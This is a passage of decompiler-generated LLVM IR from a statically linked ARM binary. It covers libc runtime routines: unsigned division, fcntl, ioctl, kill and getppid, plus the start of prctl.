  %v1_10704 = phi i32 [ %v0_106fc.pr, %dec_label_pc_106fcthread-pre-split ], [ %v4_106f0, %dec_label_pc_106fc.loopexit ]
  %v2_106fc = icmp slt i32 %v1_10704, 0
  br i1 %v2_106fc, label %dec_label_pc_10710, label %bb82

bb82:                                             ; preds = %dec_label_pc_106fc
  %v4_10700 = icmp ult i32 %v1_10704, %v0_106c8
  br i1 %v4_10700, label %bb83, label %dec_label_pc_10710

bb83:                                             ; preds = %bb82
  %v3_10704 = mul i32 %v1_10704, 2
  %v2_10708 = icmp slt i32 %v1_10708, 0
  %v3_10708 = mul i32 %v1_10708, 2
  br i1 %v2_10708, label %dec_label_pc_10710, label %dec_label_pc_106fcthread-pre-split

dec_label_pc_10710:                               ; preds = %bb82, %dec_label_pc_106fc, %bb83
  %v2_1071c59 = phi i32 [ %v3_10708, %bb83 ], [ %v1_10708, %bb82 ], [ %v1_10708, %dec_label_pc_106fc ]
  %v1_1071451 = phi i32 [ %v3_10704, %bb83 ], [ %v1_10704, %bb82 ], [ %v1_10704, %dec_label_pc_106fc ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10714

dec_label_pc_10714:                               ; preds = %.thread11, %dec_label_pc_10710
  %v1_10748 = phi i32 [ %v4_10748, %.thread11 ], [ %v2_1071c59, %dec_label_pc_10710 ]
  %v1_1071c = phi i32 [ %v0_10754, %.thread11 ], [ 0, %dec_label_pc_10710 ]
  %v1_1074c = phi i32 [ %v4_1074c, %.thread11 ], [ %v1_1071451, %dec_label_pc_10710 ]
  %v1_10718 = phi i32 [ %v0_10744, %.thread11 ], [ %v0_106c8, %dec_label_pc_10710 ]
  %v3_10714 = icmp ult i32 %v1_10718, %v1_1074c
  br i1 %v3_10714, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_10714
  %v3_10718 = sub i32 %v1_10718, %v1_1074c
  store i32 %v3_10718, i32* %r0.global-to-local, align 4
  %v3_1071c = or i32 %v1_1071c, %v1_10748
  store i32 %v3_1071c, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10714, %bb84
  %v1_10724 = phi i32 [ %v1_10718, %dec_label_pc_10714 ], [ %v3_10718, %bb84 ]
  %v1_10728 = phi i32 [ %v1_1071c, %dec_label_pc_10714 ], [ %v3_1071c, %bb84 ]
  %v4_10720 = udiv i32 %v1_1074c, 2
  %v6_10720 = icmp ult i32 %v1_10724, %v4_10720
  br i1 %v6_10720, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_10724 = urem i32 %v1_1074c, 2
  %v4_10724 = icmp eq i32 %v3_10724, 0
  %v6_10724 = sub i32 %v1_10724, %v4_10720
  store i32 %v6_10724, i32* %r0.global-to-local, align 4
  br i1 %v4_10724, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_10728 = udiv i32 %v1_10748, 2
  %v6_10728 = or i32 %v1_10728, %v5_10728
  store i32 %v6_10728, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_10730 = phi i32 [ %v6_10724, %bb85 ], [ %v1_10724, %.thread7 ], [ %v6_10724, %bb86 ]
  %v1_10734 = phi i32 [ %v1_10728, %bb85 ], [ %v1_10728, %.thread7 ], [ %v6_10728, %bb86 ]
  %v4_1072c = udiv i32 %v1_1074c, 4
  %v6_1072c = icmp ult i32 %v1_10730, %v4_1072c
  br i1 %v6_1072c, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_10730 = and i32 %v1_1074c, 2
  %v4_10730 = icmp eq i32 %v3_10730, 0
  %v6_10730 = sub i32 %v1_10730, %v4_1072c
  store i32 %v6_10730, i32* %r0.global-to-local, align 4
  br i1 %v4_10730, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_10734 = udiv i32 %v1_10748, 4
  %v6_10734 = or i32 %v1_10734, %v5_10734
  store i32 %v6_10734, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_1073c = phi i32 [ %v6_10730, %bb87 ], [ %v1_10730, %.thread8 ], [ %v6_10730, %bb88 ]
  %v1_10740 = phi i32 [ %v1_10734, %bb87 ], [ %v1_10734, %.thread8 ], [ %v6_10734, %bb88 ]
  %v4_10738 = udiv i32 %v1_1074c, 8
  %v6_10738 = icmp ult i32 %v1_1073c, %v4_10738
  br i1 %v6_10738, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_1073c = and i32 %v1_1074c, 4
  %v4_1073c = icmp eq i32 %v3_1073c, 0
  %v6_1073c = sub i32 %v1_1073c, %v4_10738
  store i32 %v6_1073c, i32* %r0.global-to-local, align 4
  br i1 %v4_1073c, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10740 = udiv i32 %v1_10748, 8
  %v6_10740 = or i32 %v1_10740, %v5_10740
  store i32 %v6_10740, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10754 = phi i32 [ %v1_10740, %bb89 ], [ %v1_10740, %.thread9 ], [ %v6_10740, %bb90 ]
  %v0_10744 = phi i32 [ %v6_1073c, %bb89 ], [ %v1_1073c, %.thread9 ], [ %v6_1073c, %bb90 ]
  %v2_10744 = icmp eq i32 %v0_10744, 0
  br i1 %v2_10744, label %dec_label_pc_10754, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10748, 16
  br i1 %tmp138, label %dec_label_pc_10754, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10748 = udiv i32 %v1_10748, 16
  %v4_1074c = udiv i32 %v1_1074c, 16
  br label %dec_label_pc_10714

dec_label_pc_10754:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_10754, i32* %r0.global-to-local, align 4
  ret i32 %v0_10754

dec_label_pc_1075c:                               ; preds = %dec_label_pc_106c8
  %v9_106c8 = icmp eq i32 %v0_106c8, %v1_106c8
  %. = zext i1 %v9_106c8 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_10768:                               ; preds = %dec_label_pc_106d0
  %v2_10768 = icmp ugt i32 %v1_106c8, 65535
  br i1 %v2_10768, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10768
  %v2_1076c = and i32 %v1_106c8, 32768
  %v3_1076c = icmp eq i32 %v2_1076c, 0
  %v4_1076c = udiv i32 %v1_106c8, 65536
  br i1 %v3_1076c, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10768
  %v0_1077865 = phi i32 [ %v1_106c8, %dec_label_pc_10768 ], [ %v4_1076c, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_1077c = phi i32 [ %v0_1077865, %.thread16 ], [ %v4_1076c, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10778 = icmp ugt i32 %v1_1077c, 255
  br i1 %v2_10778, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_1077c = and i32 %v1_1077c, 128
  %v3_1077c = icmp eq i32 %v2_1077c, 0
  %v4_1077c = udiv i32 %v1_1077c, 256
  br i1 %v3_1077c, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10780 = or i32 %storemerge, 8
  store i32 %v2_10780, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_1078c = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10780, %bb98 ]
  %v1_10788 = phi i32 [ %v1_1077c, %bb96 ], [ %v4_1077c, %bb97 ], [ %v4_1077c, %bb98 ]
  %v2_10784 = icmp ugt i32 %v1_10788, 15
  br i1 %v2_10784, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10788 = and i32 %v1_10788, 8
  %v3_10788 = icmp eq i32 %v2_10788, 0
  %v4_10788 = udiv i32 %v1_10788, 16
  br i1 %v3_10788, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1078c = add nsw i32 %v1_1078c, 4
  store i32 %v2_1078c, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10794 = phi i32 [ %v1_1078c, %.thread17 ], [ %v1_1078c, %bb99 ], [ %v2_1078c, %bb100 ]
  %v5_10798 = phi i32 [ %v1_10788, %.thread17 ], [ %v4_10788, %bb99 ], [ %v4_10788, %bb100 ]
  %v2_10790 = icmp ugt i32 %v5_10798, 3
  %v7_10790 = icmp eq i32 %v5_10798, 4
  %v2_10794 = xor i1 %v7_10790, true
  %v3_10794 = and i1 %v2_10790, %v2_10794
  br i1 %v3_10794, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10794 = add nsw i32 %v4_10794, 3
  store i32 %v5_10794, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10798 = phi i32 [ %v4_10794, %.thread18 ], [ %v5_10794, %bb101 ]
  %v2_10798 = xor i1 %v2_10790, true
  %v3_10798 = or i1 %v7_10790, %v2_10798
  br i1 %v3_10798, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10798 = udiv i32 %v5_10798, 2
  %v9_10798 = add i32 %v4_10798, %v8_10798
  store i32 %v9_10798, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_1079c = phi i32 [ %v4_10798, %bb102 ], [ %v9_10798, %bb103 ]
  %v6_1079c = lshr i32 %v0_106c8, %v1_1079c
  store i32 %v6_1079c, i32* %r0.global-to-local, align 4
  ret i32 %v6_1079c

dec_label_pc_107a4:                               ; preds = %entry
  %v0_107a8 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10798, { 1, 0 }
  uselistorder i1 %v7_10790, { 1, 0 }
  uselistorder i32 %v4_10788, { 1, 0 }
  uselistorder i32 %v1_10788, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10780, { 1, 0 }
  uselistorder i32 %v4_1077c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1077c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1076c, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10744, { 1, 0 }
  uselistorder i32 %v0_10754, { 1, 0, 2 }
  uselistorder i32 %v4_10738, { 1, 0 }
  uselistorder i32 %v1_10740, { 1, 2, 0 }
  uselistorder i32 %v4_1072c, { 1, 0 }
  uselistorder i32 %v1_10734, { 1, 2, 0 }
  uselistorder i32 %v4_10720, { 1, 0 }
  uselistorder i32 %v1_10728, { 1, 2, 0 }
  uselistorder i32 %v1_1074c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1071c, { 1, 0 }
  uselistorder i32 %v1_10748, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_10708, { 1, 0 }
  uselistorder i32 %v3_10704, { 1, 0 }
  uselistorder i32 %v1_10704, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10708, { 1, 2, 0, 3 }
  uselistorder i32 %v4_106f4, { 1, 0 }
  uselistorder i32 %v4_106f0, { 2, 1, 0 }
  uselistorder i32 %v1_106f4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_106fc.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_106c8, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_106c8, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_106bc, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 52, 2, 28, 53, 27, 54, 25, 55, 26, 56, 57, 10, 58, 3, 59, 60, 32, 61, 31, 62, 29, 63, 30, 64, 12, 11, 65, 66, 33, 67, 34, 68, 14, 13, 69, 70, 35, 71, 36, 72, 15, 16, 4, 5, 23, 22, 38, 73, 37, 74, 17, 18, 6, 39, 75, 40, 76, 77, 78, 19, 79, 80, 7, 41, 81, 42, 82, 43, 83, 84, 85, 20, 86, 87, 8, 46, 88, 44, 89, 45, 90, 91, 21, 92, 24, 47, 93, 48, 94, 49, 95, 96, 97, 50, 98, 99, 100, 101, 51, 102, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10754, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_10710, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106fcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_107bc = udiv i32 %arg1, %arg2
  ret i32 %v2_107bc
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_107d8 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_107d8
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_107f4 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_107f4, 2
  br i1 %tmp, label %dec_label_pc_10830, label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_10864, label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %dec_label_pc_1080c
  %v0_10824 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10858

dec_label_pc_10830:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_1084c, label %dec_label_pc_10864

dec_label_pc_1084c:                               ; preds = %dec_label_pc_10830
  %v0_10850 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_10820, %dec_label_pc_1084c
  %storemerge2 = phi i32 [ %v0_10824, %dec_label_pc_10820 ], [ %v0_10850, %dec_label_pc_1084c ]
  %storemerge.in = load i16, i16* @global_var_216ec.303, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_10858 = load i32, i32* %r2.global-to-local, align 4
  %v1_10858 = sub i32 0, %v0_10858
  store i32 %v1_10858, i32* %r2.global-to-local, align 4
  %v3_1085c = add i32 %storemerge, %storemerge2
  %v4_1085c = inttoptr i32 %v3_1085c to i32*
  store i32 %v1_10858, i32* %v4_1085c, align 4
  br label %dec_label_pc_10864

dec_label_pc_10864:                               ; preds = %dec_label_pc_1080c, %dec_label_pc_10830, %dec_label_pc_10858
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10858 ], [ %arg1, %dec_label_pc_10830 ], [ %arg1, %dec_label_pc_1080c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10864, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10858, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_1087c = load i32, i32* @r2, align 4
  %v9_1087c = load i32, i32* @r3, align 4
  store i32 %v9_1087c, i32* %stack_var_-4, align 4
  %v3_10880 = load i32, i32* @r4, align 4
  store i32 %v3_10880, i32* %stack_var_-32, align 4
  %v6_10880 = load i32, i32* @r5, align 4
  %v12_10880 = load i32, i32* @r7, align 4
  %v4_10890 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  %v2_10898 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10898, i32* @r3, align 4
  %v2_1089c = icmp eq i32 %v4_10890, 0
  %v0_108a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_108a4, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_1087c, i32* @r4, align 4
  br i1 %v2_1089c, label %dec_label_pc_108c0, label %dec_label_pc_108b4

dec_label_pc_108b4:                               ; preds = %entry
  %v7_108b4 = icmp eq i32 %arg2, 7
  br i1 %v7_108b4, label %dec_label_pc_10900, label %bb

bb:                                               ; preds = %dec_label_pc_108b4
  %v8_108b8 = icmp eq i32 %arg2, 14
  br i1 %v8_108b8, label %dec_label_pc_10900, label %dec_label_pc_108c0

dec_label_pc_108c0:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_108a4, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_108a4, -4095
  br i1 %tmp, label %dec_label_pc_108f8, label %dec_label_pc_108e0

dec_label_pc_108e0:                               ; preds = %dec_label_pc_108c0
  %v0_108e4 = call i32 @__aeabi_read_tp()
  %v3_108e8 = load i16, i16* @global_var_216ec.303, align 2
  %v4_108e8 = sext i16 %v3_108e8 to i32
  store i32 %v4_108e8, i32* @r3, align 4
  %v0_108ec = load i32, i32* @r2, align 4
  %v1_108ec = sub i32 0, %v0_108ec
  store i32 %v1_108ec, i32* @r2, align 4
  %v3_108f0 = add i32 %v4_108e8, %v0_108e4
  %v4_108f0 = inttoptr i32 %v3_108f0 to i32*
  store i32 %v1_108ec, i32* %v4_108f0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_108f8

dec_label_pc_108f8:                               ; preds = %dec_label_pc_108c0, %dec_label_pc_108e0
  %v0_108f8 = phi i32 [ %v0_108a4, %dec_label_pc_108c0 ], [ -1, %dec_label_pc_108e0 ]
  br label %dec_label_pc_1094c

dec_label_pc_10900:                               ; preds = %dec_label_pc_108b4, %bb
  %v0_10900 = call i32 @__libc_enable_asynccancel()
  %v0_10904 = load i32, i32* @r7, align 4
  store i32 %v0_10904, i32* @r1, align 4
  store i32 %v0_10900, i32* %r6.global-to-local, align 4
  %v0_10910 = load i32, i32* @r5, align 4
  store i32 %v0_10910, i32* %r0.global-to-local, align 4
  store i32 %v0_10910, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_10910, -4095
  br i1 %tmp15, label %dec_label_pc_10940, label %dec_label_pc_10928

dec_label_pc_10928:                               ; preds = %dec_label_pc_10900
  %v1_1092c = sub i32 0, %v0_10910
  %v0_10930 = call i32 @__aeabi_read_tp()
  store i32 %v0_10930, i32* %r0.global-to-local, align 4
  %v3_10934 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10934 = sext i16 %v3_10934 to i32
  store i32 %v4_10934, i32* @r3, align 4
  %v3_10938 = add i32 %v4_10934, %v0_10930
  %v4_10938 = inttoptr i32 %v3_10938 to i32*
  store i32 %v1_1092c, i32* %v4_10938, align 4
  store i32 -1, i32* @r2, align 4
  %v0_10940.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10940

dec_label_pc_10940:                               ; preds = %dec_label_pc_10900, %dec_label_pc_10928
  %v0_10944 = phi i32 [ %v0_10910, %dec_label_pc_10900 ], [ -1, %dec_label_pc_10928 ]
  %v0_10940 = phi i32 [ %v0_10900, %dec_label_pc_10900 ], [ %v0_10940.pre, %dec_label_pc_10928 ]
  store i32 %v0_10940, i32* %r0.global-to-local, align 4
  store i32 %v0_10944, i32* @r7, align 4
  %v1_10948 = call i32 @__libc_disable_asynccancel(i32 %v0_10940)
  store i32 %v1_10948, i32* %r0.global-to-local, align 4
  %v0_1094c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1094c

dec_label_pc_1094c:                               ; preds = %dec_label_pc_108f8, %dec_label_pc_10940
  %v0_1094c = phi i32 [ %v0_108f8, %dec_label_pc_108f8 ], [ %v0_1094c.pre, %dec_label_pc_10940 ]
  store i32 %v0_1094c, i32* %r0.global-to-local, align 4
  %v2_10954 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10954, i32* @r4, align 4
  store i32 %v6_10880, i32* @r5, align 4
  store i32 %v12_10880, i32* @r7, align 4
  ret i32 %v0_1094c

; uselistorder directives
  uselistorder i32 %v0_1094c, { 1, 0 }
  uselistorder i32 %v0_10940, { 1, 0 }
  uselistorder i32 %v0_10910, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_108a4, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_1094c, { 1, 0 }
  uselistorder label %dec_label_pc_10940, { 1, 0 }
  uselistorder label %dec_label_pc_10900, { 1, 0 }
  uselistorder label %dec_label_pc_108f8, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_10980 = load i32, i32* @r0, align 4
  ret i32 %v1_10980
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_10984 = load i32, i32* @r3, align 4
  store i32 %v9_10984, i32* %stack_var_-4, align 4
  %v3_10988 = load i32, i32* @r4, align 4
  store i32 %v3_10988, i32* %stack_var_-32, align 4
  %v6_10988 = load i32, i32* @r5, align 4
  %v12_10988 = load i32, i32* @r7, align 4
  %v4_10998 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  %v2_109a0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_109a0, i32* @r3, align 4
  %v2_109a4 = icmp eq i32 %v4_10998, 0
  %v0_109ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_109ac, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_109a4, label %dec_label_pc_109bc, label %dec_label_pc_109f4

dec_label_pc_109bc:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_109ac, -4095
  br i1 %tmp, label %dec_label_pc_109ec, label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_109bc
  %v1_109d8 = sub i32 0, %v0_109ac
  %v3_109dc = load i16, i16* @global_var_216ec.303, align 2
  %v4_109dc = sext i16 %v3_109dc to i32
  store i32 %v4_109dc, i32* @r3, align 4
  %v0_109e0 = call i32 @__aeabi_read_tp()
  %v2_109e4 = load i32, i32* @r3, align 4
  %v3_109e4 = add i32 %v2_109e4, %v0_109e0
  %v4_109e4 = inttoptr i32 %v3_109e4 to i32*
  store i32 %v1_109d8, i32* %v4_109e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_109ec

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109bc, %dec_label_pc_109d4
  %v0_109ec = phi i32 [ %v0_109ac, %dec_label_pc_109bc ], [ -1, %dec_label_pc_109d4 ]
  br label %dec_label_pc_10a40

dec_label_pc_109f4:                               ; preds = %entry
  %v0_109f4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_109f4, i32* %r6.global-to-local, align 4
  %v0_10a04 = load i32, i32* @r4, align 4
  store i32 %v0_10a04, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10a04, -4095
  br i1 %tmp15, label %dec_label_pc_10a34, label %dec_label_pc_10a1c

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_109f4
  %v1_10a20 = sub i32 0, %v0_10a04
  %v3_10a24 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10a24 = sext i16 %v3_10a24 to i32
  store i32 %v4_10a24, i32* @r3, align 4
  %v0_10a28 = call i32 @__aeabi_read_tp()
  store i32 %v0_10a28, i32* %r0.global-to-local, align 4
  %v2_10a2c = load i32, i32* @r3, align 4
  %v3_10a2c = add i32 %v2_10a2c, %v0_10a28
  %v4_10a2c = inttoptr i32 %v3_10a2c to i32*
  store i32 %v1_10a20, i32* %v4_10a2c, align 4
  %v0_10a34.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10a34

dec_label_pc_10a34:                               ; preds = %dec_label_pc_109f4, %dec_label_pc_10a1c
  %v0_10a38 = phi i32 [ %v0_10a04, %dec_label_pc_109f4 ], [ -1, %dec_label_pc_10a1c ]
  %v0_10a34 = phi i32 [ %v0_109f4, %dec_label_pc_109f4 ], [ %v0_10a34.pre, %dec_label_pc_10a1c ]
  store i32 %v0_10a34, i32* %r0.global-to-local, align 4
  store i32 %v0_10a38, i32* @r7, align 4
  %v1_10a3c = call i32 @__libc_disable_asynccancel(i32 %v0_10a34)
  store i32 %v1_10a3c, i32* %r0.global-to-local, align 4
  %v0_10a40.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10a40

dec_label_pc_10a40:                               ; preds = %dec_label_pc_109ec, %dec_label_pc_10a34
  %v0_10a40 = phi i32 [ %v0_109ec, %dec_label_pc_109ec ], [ %v0_10a40.pre, %dec_label_pc_10a34 ]
  store i32 %v0_10a40, i32* %r0.global-to-local, align 4
  %v2_10a48 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10a48, i32* @r4, align 4
  store i32 %v6_10988, i32* @r5, align 4
  store i32 %v12_10988, i32* @r7, align 4
  ret i32 %v0_10a40

; uselistorder directives
  uselistorder i32 %v0_10a40, { 1, 0 }
  uselistorder i32 %v0_10a34, { 1, 0 }
  uselistorder i32 %v0_10a04, { 1, 2, 0, 3 }
  uselistorder i32 %v0_109ac, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_10a40, { 1, 0 }
  uselistorder label %dec_label_pc_10a34, { 1, 0 }
  uselistorder label %dec_label_pc_109ec, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10a64 = load i32, i32* @r7, align 4
  store i32 %v3_10a64, i32* %stack_var_-8, align 4
  %v0_10a70 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10a70, -4095
  br i1 %tmp, label %dec_label_pc_10a90, label %dec_label_pc_10a78

dec_label_pc_10a78:                               ; preds = %entry
  %v1_10a7c = sub i32 0, %v0_10a70
  %v3_10a80 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10a80 = sext i16 %v3_10a80 to i32
  %v0_10a84 = call i32 @__aeabi_read_tp()
  %v3_10a88 = add i32 %v4_10a80, %v0_10a84
  %v4_10a88 = inttoptr i32 %v3_10a88 to i32*
  store i32 %v1_10a7c, i32* %v4_10a88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10a90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10a90

dec_label_pc_10a90:                               ; preds = %entry, %dec_label_pc_10a78
  %v1_10a94 = phi i32 [ %v0_10a70, %entry ], [ -1, %dec_label_pc_10a78 ]
  %v2_10a90 = phi i32 [ %v3_10a64, %entry ], [ %v2_10a90.pre, %dec_label_pc_10a78 ]
  store i32 %v2_10a90, i32* @r7, align 4
  ret i32 %v1_10a94

; uselistorder directives
  uselistorder i32 %v0_10a70, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a90, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10a9c = load i32, i32* @r4, align 4
  store i32 %v3_10a9c, i32* %stack_var_-12, align 4
  %v0_10aac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10aac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10aac, -4095
  br i1 %tmp, label %dec_label_pc_10ad4, label %dec_label_pc_10abc

dec_label_pc_10abc:                               ; preds = %entry
  %v0_10ac0 = call i32 @__aeabi_read_tp()
  %v3_10ac4 = load i16, i16* @global_var_216ec.303, align 2
